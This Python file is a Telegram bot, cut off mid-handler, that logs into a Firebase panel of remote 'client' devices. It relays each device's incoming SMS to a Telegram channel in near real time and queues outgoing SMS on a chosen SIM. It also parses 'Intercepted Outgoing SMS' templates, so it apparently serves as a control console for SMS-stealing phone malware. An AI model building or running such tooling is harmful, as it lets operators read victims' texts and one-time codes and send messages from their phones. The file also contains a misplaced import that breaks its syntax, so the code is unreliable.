#!/usr/bin/env python3
from __future__ import annotations

import asyncio
import base64
import html
import json
import os
import re
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib import error, parse, request

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ChatType, ParseMode
from aiogram.enums.chat_member_status import ChatMemberStatus
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    CallbackQuery,
    ChatMemberUpdated,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

try:
    from dotenv import load_dotenv
except ImportError:
    load_dotenv = None

try:
    import aiohttp
from fastapi import FastAPI
import uvicorn

except ImportError:  # pragma: no cover
    aiohttp = None


router = Router()

app = FastAPI()
@app.get("/")
async def health():
    return {"status": "ok"}


OWNER_ID = 8342366022
ACCESS_STORE_PATH = Path(__file__).parent / "access_store.json"
ACCESS_LOCK = asyncio.Lock()
ACCESS_DATA: dict[str, Any] | None = None


class SetupFlow(StatesGroup):
    waiting_channel_id = State()
    waiting_firebase_url = State()
    waiting_auth_key = State()


@dataclass
class RuntimeSelection:
    operator_user_id: int | None = None
    firebase_url: str | None = None
    auth_key: str | None = None
    selected_device_id: str | None = None
    selected_sim_slot: int | None = None
    channel_id: int | None = None
    awaiting_channel_id: bool = False
    monitor_message_id: int | None = None
    devices: list[str] | None = None


RUNTIME = RuntimeSelection(devices=[])
MONITOR_TASK: asyncio.Task[None] | None = None
LAST_MONITOR_TEXT: str | None = None


TO_PATTERN = re.compile(r"📞\s*To:\s*(.+?)(?:\n|$)", re.MULTILINE)
MESSAGE_PATTERN = re.compile(r"💬\s*Message:\s*(.+?)(?:\n|$)", re.MULTILINE)
DEVICES_PER_PAGE = 10
BUTTONS_PER_ROW = 2
LOG_PATH = Path(__file__).parent / "audit.log"
DEVICE_REFRESH_INTERVAL_SECONDS = 3
# Extremely frequent monitor edits can starve message handling.
MONITOR_REFRESH_INTERVAL_SECONDS = 0.5


def _new_access_store() -> dict[str, Any]:
    return {
        "owner": {
            "user_id": OWNER_ID,
            "channel_id": None,
        },
        # user_id (string) -> { channel_id: int|null, approved_by, approved_at }
        "approved_users": {},
    }


def _load_access_store_sync() -> dict[str, Any]:
    ACCESS_STORE_PATH.parent.mkdir(parents=True, exist_ok=True)
    if not ACCESS_STORE_PATH.exists():
        data = _new_access_store()
        ACCESS_STORE_PATH.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
        return data
    try:
        raw = ACCESS_STORE_PATH.read_text(encoding="utf-8").strip()
        parsed = json.loads(raw) if raw else _new_access_store()
        if not isinstance(parsed, dict):
            return _new_access_store()

        # Migration from older formats:
        # - v1: { owner_id, approved_users: [..], allowed_channels: { "-100..": {...}} }
        # - v2: { owner: { user_id, channels: [...] }, approved_users: { uid: { channels:[...] } } }
        if "owner_id" in parsed or "allowed_channels" in parsed:
            migrated = _new_access_store()
            migrated["owner"]["user_id"] = int(parsed.get("owner_id", OWNER_ID) or OWNER_ID)

            # Best-effort migration: old global allowed channels -> owner channels
            allowed_channels = parsed.get("allowed_channels", {})
            if isinstance(allowed_channels, dict):
                # pick one (last) channel id
                picked: int | None = None
                for ch in allowed_channels.keys():
                    if isinstance(ch, str) and _is_numeric_intlike(ch):
                        picked = int(ch)
                migrated["owner"]["channel_id"] = picked

            approved_list = parsed.get("approved_users", [])
            if isinstance(approved_list, list):
                for uid in approved_list:
                    try:
                        uid_int = int(uid)
                    except Exception:
                        continue
                    if uid_int == OWNER_ID:
                        continue
                    migrated["approved_users"][str(uid_int)] = {"channel_id": None}
            # Owner must remain correct
            migrated["owner"]["user_id"] = OWNER_ID
            return migrated

        # Migrate v2 -> v3 (single channel)
        if isinstance(parsed.get("owner"), dict) and "channels" in parsed["owner"]:
            migrated = _new_access_store()
            migrated["owner"]["user_id"] = OWNER_ID
            owner_channels = parsed["owner"].get("channels", [])
            picked_owner: int | None = None
            if isinstance(owner_channels, list) and owner_channels:
                try:
                    picked_owner = int(owner_channels[-1])
                except Exception:
                    picked_owner = None
            migrated["owner"]["channel_id"] = picked_owner

            users = parsed.get("approved_users", {})
            if isinstance(users, dict):
                for uid_str, rec in users.items():
                    if not isinstance(uid_str, str) or not _is_numeric_intlike(uid_str):
                        continue
                    if int(uid_str) == OWNER_ID:
                        continue
                    picked: int | None = None
                    if isinstance(rec, dict):
                        chs = rec.get("channels", [])
                        if isinstance(chs, list) and chs:
                            try:
                                picked = int(chs[-1])
                            except Exception:
                                picked = None
                        migrated["approved_users"][str(int(uid_str))] = {
                            "channel_id": picked,
                            **{k: v for k, v in rec.items() if k != "channels"},
                        }
            return migrated

        # Expected new format
        data = parsed
        owner = data.get("owner")
        if not isinstance(owner, dict):
            data["owner"] = {"user_id": OWNER_ID, "channel_id": None}
        else:
            owner.setdefault("user_id", OWNER_ID)
            owner["user_id"] = OWNER_ID
            owner.setdefault("channel_id", None)
            ch = owner.get("channel_id")
            if ch is None:
                owner["channel_id"] = None
            elif isinstance(ch, int):
                owner["channel_id"] = int(ch)
            elif isinstance(ch, str) and _is_numeric_intlike(ch):
                owner["channel_id"] = int(ch)
            else:
                owner["channel_id"] = None

        if not isinstance(data.get("approved_users"), dict):
            data["approved_users"] = {}
        # Normalize approved users map
        normalized: dict[str, Any] = {}
        for key, val in data["approved_users"].items():
            if not isinstance(key, str) or not _is_numeric_intlike(key):
                continue
            if int(key) == OWNER_ID:
                continue
            if not isinstance(val, dict):
                val = {}
            ch = val.get("channel_id")
            norm_channel: int | None
            if ch is None:
                norm_channel = None
            elif isinstance(ch, int):
                norm_channel = int(ch)
            elif isinstance(ch, str) and _is_numeric_intlike(ch):
                norm_channel = int(ch)
            else:
                norm_channel = None
            normalized[str(int(key))] = {
                "channel_id": norm_channel,
                **{k: v for k, v in val.items() if k != "channel_id"},
            }
        data["approved_users"] = normalized
        return data
    except Exception:
        return _new_access_store()


async def access_data() -> dict[str, Any]:
    global ACCESS_DATA
    async with ACCESS_LOCK:
        if ACCESS_DATA is None:
            ACCESS_DATA = _load_access_store_sync()
        return ACCESS_DATA


async def _save_access_store_locked() -> None:
    assert ACCESS_DATA is not None
    # Keep file stable & human-editable
    ACCESS_STORE_PATH.write_text(
        json.dumps(ACCESS_DATA, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )


async def save_access_store() -> None:
    async with ACCESS_LOCK:
        if ACCESS_DATA is None:
            ACCESS_DATA = _load_access_store_sync()
        await _save_access_store_locked()


def _is_numeric_intlike(value: str) -> bool:
    v = value.strip()
    if not v:
        return False
    if v[0] == "-":
        v = v[1:]
    return v.isdigit()


async def is_user_approved(user_id: int) -> bool:
    if int(user_id) == OWNER_ID:
        return True
    data = await access_data()
    approved = data.get("approved_users", {})
    return isinstance(approved, dict) and str(int(user_id)) in approved


async def get_user_channel_id(user_id: int) -> int | None:
    uid = int(user_id)
    data = await access_data()
    if uid == OWNER_ID:
        owner = data.get("owner", {})
        if isinstance(owner, dict) and isinstance(owner.get("channel_id"), int):
            return int(owner["channel_id"])
        return None
    users = data.get("approved_users", {})
    if not isinstance(users, dict):
        return None
    rec = users.get(str(uid))
    if not isinstance(rec, dict):
        return None
    ch = rec.get("channel_id")
    return int(ch) if isinstance(ch, int) else None


async def is_channel_allowed(channel_id: int) -> bool:
    data = await access_data()
    cid = int(channel_id)
    owner = data.get("owner", {})
    owner_cid = owner.get("channel_id") if isinstance(owner, dict) else None
    if isinstance(owner_cid, int) and cid == owner_cid:
        return True
    approved = data.get("approved_users", {})
    if not isinstance(approved, dict):
        return False
    for _, rec in approved.items():
        if not isinstance(rec, dict):
            continue
        rec_cid = rec.get("channel_id")
        if isinstance(rec_cid, int) and cid == rec_cid:
            return True
    return False


async def approve_user(target_user_id: int) -> None:
    async with ACCESS_LOCK:
        global ACCESS_DATA
        if ACCESS_DATA is None:
            ACCESS_DATA = _load_access_store_sync()
        if int(target_user_id) == OWNER_ID:
            return
        users = ACCESS_DATA.setdefault("approved_users", {})
        if not isinstance(users, dict):
            users = {}
            ACCESS_DATA["approved_users"] = users
        users.setdefault(
            str(int(target_user_id)),
            {
                "channel_id": None,
                "approved_by": OWNER_ID,
                "approved_at": datetime.now(timezone.utc).isoformat(),
            },
        )
        await _save_access_store_locked()


async def revoke_user(target_user_id: int) -> None:
    async with ACCESS_LOCK:
        global ACCESS_DATA
        if ACCESS_DATA is None:
            ACCESS_DATA = _load_access_store_sync()
        if int(target_user_id) == OWNER_ID:
            return
        users = ACCESS_DATA.setdefault("approved_users", {})
        if isinstance(users, dict):
            users.pop(str(int(target_user_id)), None)
        await _save_access_store_locked()


async def allow_channel(channel_id: int, added_by_user_id: int) -> None:
    async with ACCESS_LOCK:
        global ACCESS_DATA
        if ACCESS_DATA is None:
            ACCESS_DATA = _load_access_store_sync()
        cid = int(channel_id)
        uid = int(added_by_user_id)

        if uid == OWNER_ID:
            owner = ACCESS_DATA.setdefault("owner", {"user_id": OWNER_ID, "channel_id": None})
            if not isinstance(owner, dict):
                owner = {"user_id": OWNER_ID, "channel_id": None}
                ACCESS_DATA["owner"] = owner
            owner["user_id"] = OWNER_ID
            owner["channel_id"] = cid
        else:
            users = ACCESS_DATA.setdefault("approved_users", {})
            if not isinstance(users, dict):
                users = {}
                ACCESS_DATA["approved_users"] = users
            rec = users.setdefault(
                str(uid),
                {"channel_id": None, "approved_by": OWNER_ID, "approved_at": None},
            )
            if not isinstance(rec, dict):
                rec = {"channel_id": None}
                users[str(uid)] = rec
            rec["channel_id"] = cid
        await _save_access_store_locked()


async def disallow_channel(channel_id: int) -> None:
    async with ACCESS_LOCK:
        global ACCESS_DATA
        if ACCESS_DATA is None:
            ACCESS_DATA = _load_access_store_sync()
        cid = int(channel_id)
        owner = ACCESS_DATA.get("owner", {})
        if isinstance(owner, dict) and isinstance(owner.get("channel_id"), int) and owner["channel_id"] == cid:
            owner["channel_id"] = None
        users = ACCESS_DATA.get("approved_users", {})
        if isinstance(users, dict):
            for _, rec in users.items():
                if not isinstance(rec, dict):
                    continue
                if isinstance(rec.get("channel_id"), int) and rec["channel_id"] == cid:
                    rec["channel_id"] = None
        await _save_access_store_locked()


async def ensure_private_approved(message: Message) -> bool:
    if not message.from_user:
        return False
    if await is_user_approved(message.from_user.id):
        return True
    await message.answer(
        "Access denied.\n"
        "Ask the owner to approve you, or use `/request_access` in this chat."
    )
    return False


async def ensure_callback_approved(callback: CallbackQuery) -> bool:
    if not callback.from_user:
        return False
    if await is_user_approved(callback.from_user.id):
        return True
    await callback.answer("Access denied. Ask owner to approve you.", show_alert=True)
    return False


@dataclass
class ParsedSMS:
    to: str
    message: str


def append_audit_log(entry: dict[str, Any]) -> None:
    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    with LOG_PATH.open("a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def parse_template_block(raw_text: str) -> ParsedSMS:
    # 1. Try the "Intercepted Outgoing SMS" format
    # Format:
    # Intercepted Outgoing SMS
    # To (Tap to copy):
    # {phone}
    # Body (Tap to copy):
    # {message}
    intercepted_match = re.search(
        r"Intercepted Outgoing SMS.*?To\s*\(Tap to copy\):\s*\n\s*(?P<to>[^\n]+?)\s*\n.*?Body\s*\(Tap to copy\):\s*\n\s*(?P<msg>.+?)(?:\n|$)",
        raw_text,
        re.DOTALL | re.IGNORECASE
    )
    if intercepted_match:
        to_val = intercepted_match.group("to").strip()
        msg_val = intercepted_match.group("msg").strip()
        if to_val and msg_val:
            return ParsedSMS(to=to_val, message=msg_val)

    # 2. Try the emoji-labeled format (now with multi-line message support)
    to_match = TO_PATTERN.search(raw_text)
    # Capture message content until a common footer or end of string
    msg_match = re.search(
        r"💬\s*Message:\s*(?P<msg>.+?)(?:\n+📋|\n+━━━━━━━━━━━━━━|\Z)",
        raw_text,
        re.DOTALL
    )

    if to_match and msg_match:
        to_val = to_match.group(1).strip()
        msg_val = msg_match.group("msg").strip()
        if to_val and msg_val:
            return ParsedSMS(to=to_val, message=msg_val)

    # 3. Try the "One-tap copy" block format as a fallback
    # Format:
    # 📋 One-tap copy:
    # {number} | {message}
    one_tap_match = re.search(
        r"📋\s*One-tap copy:\s*\n\s*(?P<to>[+\d\s\-]+)\s*\|\s*(?P<msg>.+)",
        raw_text,
        re.MULTILINE | re.DOTALL
    )
    if one_tap_match:
        to_val = one_tap_match.group("to").strip()
        msg_val = one_tap_match.group("msg").strip()
        if to_val and msg_val:
            return ParsedSMS(to=to_val, message=msg_val)

    # 4. Generic fallback (looks for "To:" and "Message:" anywhere, case-insensitive)
    to_match = re.search(r"(?:To|Recipient|Phone):\s*(?P<to>[+\d\s\-]+)", raw_text, re.IGNORECASE)
    msg_match = re.search(r"(?:Message|Text|Body|Msg):\s*(?P<msg>.+)", raw_text, re.IGNORECASE | re.DOTALL)
    if to_match and msg_match:
        # If Message comes before To, we might need to clean up msg_val
        # But usually To is at the top.
        to_val = to_match.group("to").strip()
        msg_val = msg_match.group("msg").strip()
        # If msg_val contains the To: line (because it was matched by .+ in DOTALL), we strip it
        if to_match.group(0) in msg_val:
             msg_val = msg_val.replace(to_match.group(0), "").strip()

        if to_val and msg_val:
            return ParsedSMS(to=to_val, message=msg_val)

    # 5. Final fallback to the original strict patterns
    to_match = TO_PATTERN.search(raw_text)
    msg_match = MESSAGE_PATTERN.search(raw_text)
    if to_match and msg_match:
        to_val = to_match.group(1).strip()
        msg_val = msg_match.group(1).strip()
        if to_val and msg_val:
            return ParsedSMS(to=to_val, message=msg_val)

    raise ValueError("Could not parse SMS recipient or message from the provided template.")


def firebase_get(base_url: str, auth_key: str, path: str) -> Any:
    clean_base = base_url.rstrip("/")
    clean_path = path.strip("/")
    query = parse.urlencode({"auth": auth_key})
    url = f"{clean_base}/{clean_path}.json?{query}"
    with request.urlopen(url, timeout=20) as response:
        body = response.read().decode("utf-8")
        return json.loads(body) if body else None


def build_send_sms_url(base_url: str, device_id: str, auth_key: str) -> str:
    clean_base = base_url.rstrip("/")
    clean_device = str(device_id).strip()
    query = parse.urlencode({"auth": auth_key})
    # Panel UI enqueues SMS here:
    # clients/<deviceId>/webhookEvent/sendSms
    return f"{clean_base}/clients/{parse.quote(clean_device)}/webhookEvent/sendSms.json?{query}"


def put_to_firebase(url: str, payload: dict[str, Any]) -> dict[str, Any]:
    req = request.Request(
        url,
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="PUT",
    )
    with request.urlopen(req, timeout=20) as response:
        body = response.read().decode("utf-8")
        return {"status": "ok", "firebase_response": json.loads(body) if body else None}


HTTP_SESSION: "aiohttp.ClientSession | None" = None


async def firebase_put_json(url: str, payload: dict[str, Any]) -> dict[str, Any]:
    """
    Fast Firebase PUT with connection reuse when possible.
    Falls back to running the existing urllib PUT in a worker thread.
    """
    global HTTP_SESSION
    if aiohttp is not None and HTTP_SESSION is not None and not HTTP_SESSION.closed:
        async with HTTP_SESSION.put(url, json=payload) as res:
            text = await res.text()
            if res.status >= 400:
                raise error.HTTPError(url, res.status, res.reason, res.headers, None)
            return {
                "status": "ok",
                "firebase_response": json.loads(text) if text else None,
            }
    return await asyncio.to_thread(put_to_firebase, url, payload)


def looks_online(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value == 1
    return str(value).strip().lower() in {"online", "true", "1", "yes", "connected"}


def looks_test(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value == 1
    return str(value).strip().lower() in {"test", "testing", "true", "1", "yes"}


def normalize_devices(raw: Any) -> list[str]:
    if not isinstance(raw, dict):
        return []
    found: set[str] = set()

    for key, val in raw.items():
        if isinstance(val, dict):
            device_id = str(
                val.get("device_id")
                or val.get("deviceId")
                or val.get("id")
                or val.get("uid")
                or key
            ).strip()
            online = (
                looks_online(val.get("status"))
                or looks_online(val.get("state"))
                or bool(val.get("isOnline"))
                or bool(val.get("online"))
            )
            has_test_marker = any(
                key in val for key in ("type", "mode", "isTest", "test", "isTestDevice")
            )
            # Many panels store only online/offline in `clients` without test flags.
            # If test markers are absent, treat the device as eligible.
            test_device = (
                looks_test(val.get("type"))
                or looks_test(val.get("mode"))
                or bool(val.get("isTest"))
                or bool(val.get("test"))
                or bool(val.get("isTestDevice"))
                or not has_test_marker
            )
            if device_id and online and test_device:
                found.add(device_id)
    return sorted(found)


def fetch_online_test_devices(base_url: str, auth_key: str) -> list[str]:
    candidate_paths = ["devices", "device_registry", "clients", "device_status"]
    devices: set[str] = set()
    for path in candidate_paths:
        try:
            data = firebase_get(base_url, auth_key, path)
            devices.update(normalize_devices(data))
        except Exception:
            continue
    return sorted(devices)


def fetch_last_sms(device_id: str, base_url: str, auth_key: str, limit: int = 3) -> list[dict[str, str]]:
    data = firebase_get(base_url, auth_key, f"messages/{device_id}")
    if not isinstance(data, dict):
        return []

    rows: list[tuple[int, dict[str, Any]]] = []
    for key, val in data.items():
        if not isinstance(val, dict):
            continue
        if str(val.get("type", "")).strip().lower() not in {"incoming", ""}:
            continue
        numeric_id: int | None = None
        raw_id = val.get("id")
        if isinstance(raw_id, (int, float)):
            numeric_id = int(raw_id)
        else:
            try:
                numeric_id = int(str(key))
            except Exception:
                numeric_id = None
        if numeric_id is None:
            continue
        rows.append((numeric_id, val))

    rows.sort(key=lambda item: item[0], reverse=True)
    latest = rows[:limit]
    out: list[dict[str, str]] = []
    for _, item in latest:
        out.append(
            {
                "from": str(item.get("sender", "-")).strip(),
                "text": str(item.get("message", "")).strip(),
                "at": str(item.get("dateTime", "-")).strip(),
            }
        )
    return out


def build_sms_monitor_text() -> str:
    if not (RUNTIME.firebase_url and RUNTIME.auth_key and RUNTIME.selected_device_id):
        return "Monitoring started.\nWaiting for setup details..."
    sms_rows = fetch_last_sms(
        RUNTIME.selected_device_id,
        RUNTIME.firebase_url,
        RUNTIME.auth_key,
        limit=3,
    )
    header = (
        "Monitoring started.\n"
        f"Channel id: <code>{RUNTIME.channel_id}</code>\n"
        f"Device: <code>{RUNTIME.selected_device_id}</code>\n"
        f"SIM: <code>SIM {RUNTIME.selected_sim_slot}</code>\n\n"
        "<b>Last 3 SMS:</b>\n"
    )
    if not sms_rows:
        return header + "<code>No SMS found yet.</code>"

    lines: list[str] = []
    for idx, row in enumerate(sms_rows, start=1):
        sender = html.escape(row["from"])
        at = html.escape(row["at"])
        msg = html.escape(row["text"])
        lines.append(
            f"\n<b>SMS {idx}</b>\n"
            f"From: <code>{sender}</code>\n"
            f"At: <code>{at}</code>\n"
            f"<pre>{msg}</pre>\n"
            "------------------------------"
        )
    return header + "\n".join(lines)


async def start_sms_live_monitor(bot: Bot) -> None:
    global MONITOR_TASK, LAST_MONITOR_TEXT

    if MONITOR_TASK is not None:
        MONITOR_TASK.cancel()
        try:
            await MONITOR_TASK
        except asyncio.CancelledError:
            pass
    LAST_MONITOR_TEXT = None

    async def _loop() -> None:
        global LAST_MONITOR_TEXT
        while True:
            try:
                if not (RUNTIME.channel_id and RUNTIME.monitor_message_id):
                    await asyncio.sleep(MONITOR_REFRESH_INTERVAL_SECONDS)
                    continue
                text = await asyncio.to_thread(build_sms_monitor_text)
                if text != LAST_MONITOR_TEXT:
                    await bot.edit_message_text(
                        chat_id=RUNTIME.channel_id,
                        message_id=RUNTIME.monitor_message_id,
                        text=text,
                        parse_mode=ParseMode.HTML,
                    )
                    LAST_MONITOR_TEXT = text
            except Exception:
                pass
            await asyncio.sleep(MONITOR_REFRESH_INTERVAL_SECONDS)

    MONITOR_TASK = asyncio.create_task(_loop())


def try_parse_compact_credentials(raw_text: str) -> tuple[str, str] | None:
    raw = raw_text.strip()
    if not raw:
        return None

    def split_pair(text: str) -> tuple[str, str] | None:
        if "|||" not in text:
            return None
        left, right = text.split("|||", 1)
        firebase_url = left.strip()
        auth_key = right.strip()
        if not firebase_url or not auth_key:
            return None
        return firebase_url, auth_key

    plain = split_pair(raw)
    if plain:
        return plain

    encoded_candidate = raw
    # Support URL formats like:
    # - https://domain/s?=ENCODED
    # - https://domain/s?s=ENCODED
    # - https://domain/?s=ENCODED
    # - https://domain/any/path?data=ENCODED
    if "://" in raw:
        try:
            parsed_url = parse.urlparse(raw)
            query = parsed_url.query.strip()
            if query.startswith("="):
                encoded_candidate = query[1:].strip()
            else:
                query_map = parse.parse_qs(query, keep_blank_values=True)
                for key in ("s", "data", "d", "q", "payload"):
                    vals = query_map.get(key)
                    if vals and vals[0].strip():
                        encoded_candidate = vals[0].strip()
                        break
        except Exception:
            pass

    normalized = encoded_candidate + ("=" * ((4 - len(encoded_candidate) % 4) % 4))
    for decoder in (base64.b64decode, base64.urlsafe_b64decode):
        try:
            decoded = decoder(normalized).decode("utf-8", errors="strict")
            parsed = split_pair(decoded)
            if parsed:
                return parsed
        except Exception:
            continue
    return None


def build_devices_keyboard(devices: list[str], page: int) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    start = page * DEVICES_PER_PAGE
    chunk = devices[start : start + DEVICES_PER_PAGE]

    kb = InlineKeyboardBuilder()
    for device_id in chunk:
        kb.button(text=device_id, callback_data=f"sel:{device_id}")
    kb.adjust(BUTTONS_PER_ROW)

    nav_row: list[InlineKeyboardButton] = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="⬅ Prev", callback_data=f"page:{page - 1}"))
    nav_row.append(InlineKeyboardButton(text=f"{page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton(text="Next ➡", callback_data=f"page:{page + 1}"))
    kb.row(*nav_row)
    return kb.as_markup()


def build_sim_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardBuilder()
    kb.button(text="SIM 1", callback_data="sim:1")
    kb.button(text="SIM 2", callback_data="sim:2")
    kb.adjust(2)
    return kb.as_markup()


async def set_selected_device(message: Message, device_id: str) -> None:
    RUNTIME.selected_device_id = device_id
    RUNTIME.selected_sim_slot = None
    await message.answer(
        f"Selected device: `{device_id}`\nNow choose which SIM to use:",
        reply_markup=build_sim_keyboard(),
    )


@router.message(Command("start"), F.chat.type == ChatType.PRIVATE)
async def cmd_start(message: Message, state: FSMContext) -> None:
    if not await ensure_private_approved(message):
        return
    await state.clear()
    uid = message.from_user.id if message.from_user else 0
    existing_channel = await get_user_channel_id(uid)
    if existing_channel is None:
        await state.set_state(SetupFlow.waiting_channel_id)
        await message.answer(
            "First, setup your channel id.\n"
            "Send channel id now (example: `-1001234567890`)."
        )
        return
    await state.set_state(SetupFlow.waiting_firebase_url)
    await message.answer(
        f"Channel id already set: `{existing_channel}`\n"
        "Now send Firebase base URL:"
    )


@router.message(Command("cancel"), F.chat.type == ChatType.PRIVATE)
async def cmd_cancel(message: Message, state: FSMContext) -> None:
    if not await ensure_private_approved(message):
        return
    await state.clear()
    await message.answer("Cancelled.")


@router.message(Command("request_access"), F.chat.type == ChatType.PRIVATE)
async def cmd_request_access(message: Message) -> None:
    if not message.from_user:
        return
    if await is_user_approved(message.from_user.id):
        await message.answer("You are already approved.")
        return
    user = message.from_user
    text = (
        "Access request received.\n"
        f"User: `{user.full_name}`\n"
        f"User id: `{user.id}`\n"
        "Owner: use `/approve <user_id>` to approve."
    )
    await message.answer("Request sent to owner.")
    try:
        await message.bot.send_message(chat_id=OWNER_ID, text=text)
    except Exception:
        # Owner might not have started bot yet; still keep it silent.
        pass


@router.message(Command("approve"), F.chat.type == ChatType.PRIVATE)
async def cmd_approve(message: Message) -> None:
    if not message.from_user or message.from_user.id != OWNER_ID:
        await message.answer("Owner-only command.")
        return
    parts = (message.text or "").split()
    if len(parts) != 2 or not _is_numeric_intlike(parts[1]):
        await message.answer("Usage: `/approve <user_id>`")
        return
    target = int(parts[1])
    await approve_user(target)
    await message.answer(f"Approved user `{target}`.")


@router.message(Command("revoke"), F.chat.type == ChatType.PRIVATE)
async def cmd_revoke(message: Message) -> None:
    if not message.from_user or message.from_user.id != OWNER_ID:
        await message.answer("Owner-only command.")
        return
    parts = (message.text or "").split()
    if len(parts) != 2 or not _is_numeric_intlike(parts[1]):
        await message.answer("Usage: `/revoke <user_id>`")
        return
    target = int(parts[1])
    await revoke_user(target)
    await message.answer(f"Revoked user `{target}`.")


@router.message(Command("setup_channel"), F.chat.type == ChatType.PRIVATE)
async def cmd_setup_channel(message: Message) -> None:
    if not await ensure_private_approved(message):
        return
    parts = (message.text or "").split()
    if len(parts) != 2:
        await message.answer("Usage: `/setup_channel <channel_id>` (example: `-1001234567890`)")
        return
    raw = parts[1].strip()
    if not _is_numeric_intlike(raw):
        await message.answer("Invalid channel id. Example: `-1001234567890`")
        return
    channel_id = int(raw)
    if channel_id >= 0:
        await message.answer("Channel id should be negative. Example: `-1001234567890`")
        return
    await allow_channel(channel_id, message.from_user.id if message.from_user else OWNER_ID)
    # Also set runtime channel if operator is current user (optional convenience).
    if message.from_user and RUNTIME.operator_user_id == message.from_user.id:
        RUNTIME.channel_id = channel_id
    await message.answer(
        "Channel approved in setup.\n"
        f"Channel id: `{channel_id}`\n"
        "Now add the bot to that channel as admin."
    )


@router.message(SetupFlow.waiting_channel_id, F.chat.type == ChatType.PRIVATE, F.text)
async def on_start_channel_id(message: Message, state: FSMContext) -> None:
    if not await ensure_private_approved(message):
        return
    raw = (message.text or "").strip()
    if raw.startswith("/"):
        return
    if not _is_numeric_intlike(raw):
        await message.answer("Invalid channel id. Send numeric id like `-1001234567890`.")
        return
    channel_id = int(raw)
    if channel_id >= 0:
        await message.answer("Channel id should be negative (example: `-1001234567890`).")
        return
    if not message.from_user:
        return
    await allow_channel(channel_id, message.from_user.id)
    await state.set_state(SetupFlow.waiting_firebase_url)
    await message.answer(
        f"Saved your channel id: `{channel_id}`\n"
        "Now send Firebase base URL:"
    )


@router.message(Command("disallow_channel"), F.chat.type == ChatType.PRIVATE)
async def cmd_disallow_channel(message: Message) -> None:
    if not message.from_user or message.from_user.id != OWNER_ID:
        await message.answer("Owner-only command.")
        return
    parts = (message.text or "").split()
    if len(parts) != 2 or not _is_numeric_intlike(parts[1]):
        await message.answer("Usage: `/disallow_channel <channel_id>`")
        return
    channel_id = int(parts[1])
    await disallow_channel(channel_id)
    await message.answer(f"Removed channel `{channel_id}` from allowed list.")


@router.message(Command("access_status"), F.chat.type == ChatType.PRIVATE)
async def cmd_access_status(message: Message) -> None:
    if not message.from_user or message.from_user.id != OWNER_ID:
        await message.answer("Owner-only command.")
        return
    data = await access_data()
    owner = data.get("owner", {})
    owner_channel = owner.get("channel_id") if isinstance(owner, dict) else None
    users = data.get("approved_users", {})
    approved_ids = sorted(int(uid) for uid in users.keys()) if isinstance(users, dict) else []

    lines: list[str] = []
    lines.append("<b>Access status</b>")
    lines.append(f"Owner: <code>{OWNER_ID}</code>")
    lines.append(
        "Owner channel: <code>{}</code>".format(
            str(int(owner_channel)) if isinstance(owner_channel, int) else "-"
        )
    )
    lines.append(
        "Approved users: <code>{}</code>".format(
            ", ".join(str(x) for x in approved_ids) if approved_ids else "-"
        )
    )
    if isinstance(users, dict) and users:
        # Show a compact per-user channel mapping
        per_user_bits: list[str] = []
        for uid_str, rec in sorted(users.items(), key=lambda kv: int(kv[0])):
            if not isinstance(rec, dict):
                continue
            ch = rec.get("channel_id")
            per_user_bits.append(
                f"{uid_str}={str(int(ch)) if isinstance(ch, int) else '-'}"
            )
        lines.append("User channels:")
        lines.append(f"<code>{' | '.join(per_user_bits) if per_user_bits else '-'}</code>")
    await message.answer(
        "\n".join(lines),
        parse_mode=ParseMode.HTML,
    )


async def finalize_credentials_setup(
    message: Message, state: FSMContext, firebase_url: str, auth_key: str
) -> None:
    devices = fetch_online_test_devices(firebase_url, auth_key)
    if not devices:
        await state.clear()
        await message.answer(
            "No ONLINE test devices found.\nCheck your panel paths/fields and run /start again."
        )
        return

    RUNTIME.operator_user_id = message.from_user.id if message.from_user else None
    RUNTIME.firebase_url = firebase_url
    RUNTIME.auth_key = auth_key
    RUNTIME.devices = devices
    RUNTIME.selected_device_id = None
    RUNTIME.selected_sim_slot = None
    RUNTIME.channel_id = None
    RUNTIME.awaiting_channel_id = False
    RUNTIME.monitor_message_id = None

    await message.answer(
        "Select a device for sending channel template messages:",
        reply_markup=build_devices_keyboard(devices, page=0),
    )
    await state.clear()


@router.message(SetupFlow.waiting_firebase_url, F.chat.type == ChatType.PRIVATE, F.text)
async def on_firebase_url(message: Message, state: FSMContext) -> None:
    if not await ensure_private_approved(message):
        return
    compact = try_parse_compact_credentials(message.text)
    if compact:
        firebase_url, auth_key = compact
        await finalize_credentials_setup(message, state, firebase_url, auth_key)
        return

    await state.update_data(firebase_url=message.text.strip())
    await state.set_state(SetupFlow.waiting_auth_key)
    await message.answer(
        "Send Firebase auth key:\n"
        "Or send base64 of `firebase_url|||auth_key` in first step next time."
    )


@router.message(SetupFlow.waiting_auth_key, F.chat.type == ChatType.PRIVATE, F.text)
async def on_auth_key(message: Message, state: FSMContext) -> None:
    if not await ensure_private_approved(message):
        return
    data = await state.get_data()
    firebase_url = str(data.get("firebase_url", "")).strip()
    auth_key = message.text.strip()
    await finalize_credentials_setup(message, state, firebase_url, auth_key)


@router.callback_query(F.data == "noop")
async def on_noop(callback: CallbackQuery) -> None:
    if not await ensure_callback_approved(callback):
        return
    await callback.answer()


@router.callback_query(F.data.startswith("page:"))
async def on_page(callback: CallbackQuery) -> None:
    if not await ensure_callback_approved(callback):
        return
    if not callback.from_user or callback.from_user.id != RUNTIME.operator_user_id:
